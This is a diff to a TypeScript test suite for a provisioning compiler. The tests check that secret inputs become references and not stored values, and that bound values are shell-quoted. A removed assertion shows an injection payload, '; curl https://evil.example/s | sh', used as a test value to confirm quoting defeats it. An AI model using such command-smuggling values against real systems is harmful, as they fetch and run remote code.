@@ -11,6 +11,7 @@ import {
   primaryPort,
   renderCompose,
   interpolateShell,
+  secretRef,
   shellQuote,
   type Bindings,
 } from "./compile.ts";
@@ -218,9 +219,11 @@ describe("bindings", () => {
 describe("compose rendering", () => {
   const yaml = renderCompose(odoo, odooBindings, { portBase: 40000 });
 
-  test("interpolates inputs rather than leaking the placeholder", () => {
-    assert.ok(yaml.includes('"s3cret"'));
-    assert.ok(!yaml.includes("${input."), "no unresolved placeholders reach the VM");
+  test("interpolates non-secret inputs and leaves no placeholder behind", () => {
+    assert.ok(!yaml.includes("${input."), "no unresolved ${input.*} reaches the VM");
+    // DB_PASSWORD is declared secret, so it is a reference by design (see D9 below).
+    assert.ok(yaml.includes("${HC_SECRET_DB_PASSWORD}"));
+    assert.ok(!yaml.includes("s3cret"), "the secret value itself never appears");
   });
 
   test("assigns host ports from the session's block", () => {
@@ -418,31 +421,78 @@ describe("security: a binding must never become a command", () => {
     }
   });
 
-  test("a password containing shell metacharacters survives as data", () => {
+  test("a non-secret value containing shell metacharacters survives as data", () => {
+    // ODOO_DB_NAME is not declared secret, so it IS substituted -- and must be quoted.
     const bp = findBlueprint("odoo-18-enterprise")!;
     const bindings: Bindings = {
-      inputs: { DB_PASSWORD: evil, ODOO_DB_NAME: "acme" },
+      inputs: { DB_PASSWORD: "pw", ODOO_DB_NAME: evil },
       seeds: {}, repos: { addons: ["a"] },
     };
-    const out = interpolateShell("db_password = ${input.DB_PASSWORD}", bp, bindings);
-    assert.ok(out.includes("curl"), "the value is preserved");
-    assert.ok(!out.includes("; curl https://evil.example/s | sh; echo ''"), "but not as a command");
-    assert.equal(out, `db_password = ${shellQuote(evil)}`);
+    const out = interpolateShell("dbfilter = ${input.ODOO_DB_NAME}", bp, bindings);
+    assert.equal(out, `dbfilter = ${shellQuote(evil)}`);
   });
 
   test("setup scripts in the compiled graph are quoted, not raw", () => {
     const bp = findBlueprint("odoo-18-enterprise")!;
     const g = compileProvisioning(bp, {
-      inputs: { DB_PASSWORD: evil, ODOO_DB_NAME: "acme" },
+      inputs: { DB_PASSWORD: "pw", ODOO_DB_NAME: evil },
       seeds: {}, repos: { addons: ["a"] },
     });
     const step = g.nodes.find((n) => n.id === "setup-write-conf")!;
     const script = (step.config as { step: { script: string } }).step.script;
-    assert.ok(!script.includes("${input."), "placeholders are resolved at compile time");
-    assert.ok(script.includes(shellQuote(evil)), "and resolved through the quoting path");
+    assert.ok(!script.includes("${input."), "non-secret placeholders resolve at compile time");
+    assert.ok(script.includes(shellQuote(evil)), "through the quoting path");
   });
 
   test("an ordinary value round-trips unchanged apart from its quotes", () => {
     assert.equal(shellQuote("odoo-dev"), "'odoo-dev'");
+  });
+});
+
+describe("D9: a secret must never enter a persisted artifact", () => {
+  const bp = findBlueprint("odoo-18-enterprise")!;
+  const SECRET = "hunter2-the-real-password";
+  const bindings: Bindings = {
+    inputs: { DB_PASSWORD: SECRET, ODOO_DB_NAME: "acme" },
+    seeds: { devdb: "artifact://dumps/acme.sql", filestore: null },
+    repos: { addons: ["acme-addons"], enterprise: [] },
+  };
+
+  test("the compiled provisioning graph contains no secret value", () => {
+    const g = compileProvisioning(bp, bindings);
+    const serialised = JSON.stringify(g);
+    assert.ok(
+      !serialised.includes(SECRET),
+      "the graph is stored on flow_runs.input and emitted as events; the log is append-only",
+    );
+    assert.ok(serialised.includes("HC_SECRET_DB_PASSWORD"), "a resolvable reference is there instead");
+  });
+
+  test("the graph declares which secrets the worker must resolve", () => {
+    const g = compileProvisioning(bp, bindings);
+    assert.deepEqual(g.requiresSecrets, [
+      { key: "HC_SECRET_DB_PASSWORD", ref: secretRef("DB_PASSWORD") },
+    ]);
+  });
+
+  test("the rendered compose carries a reference, not the value", () => {
+    const yaml = renderCompose(bp, bindings, { portBase: 40000 });
+    assert.ok(!yaml.includes(SECRET), "no secret value in the generated compose file");
+    assert.match(yaml, /POSTGRES_PASSWORD: \$\{HC_SECRET_DB_PASSWORD\}/);
+  });
+
+  test("non-secret inputs are still substituted normally", () => {
+    const yaml = renderCompose(bp, bindings, { portBase: 40000 });
+    const g = compileProvisioning(bp, bindings);
+    assert.ok(JSON.stringify(g).includes("acme"), "ODOO_DB_NAME is not secret and resolves");
+    assert.ok(yaml.includes("40000:8069"), "ports still resolve");
+  });
+
+  test("a secret reference in a shell script is quoted for the shell too", () => {
+    const g = compileProvisioning(bp, bindings);
+    const step = g.nodes.find((n) => n.id === "setup-write-conf")!;
+    const script = (step.config as { step: { script: string } }).step.script;
+    assert.match(script, /db_password = "\$HC_SECRET_DB_PASSWORD"/);
+    assert.ok(!script.includes(SECRET));
   });
 });
